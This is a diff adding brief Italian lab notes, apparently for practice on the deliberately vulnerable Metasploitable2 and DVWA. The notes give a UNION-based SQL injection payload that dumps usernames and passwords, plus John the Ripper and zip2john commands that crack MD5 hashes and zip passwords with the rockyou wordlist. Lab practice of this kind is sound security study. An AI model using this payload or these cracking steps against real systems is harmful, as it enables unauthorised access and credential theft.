@@ -1,0 +1,20 @@
+passi metasploitable2 per trovare il nome della tabella
+sudo su
+mysql -u root -p
+(no password)
+USE dvwa;
+SHOW TABLES;
+
+sql injection
+1' UNION SELECT user, password FROM users#
+
+john 
+converte file in leggibile per john
+sudo gunzip rockyou.txt.gz
+john --format=raw-md5 /home/kali/Desktop/testJohn/hash.txt
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /home/kali/Desktop/testJohn/hash.txt
+john --show --format=raw-md5 /home/kali/Desktop/testJohn/hash.txt
+
+per decriptare la password di un file zip
+zip2john hash.txt=zip>zipPass.txt
+john --format=zip zipPass.txt
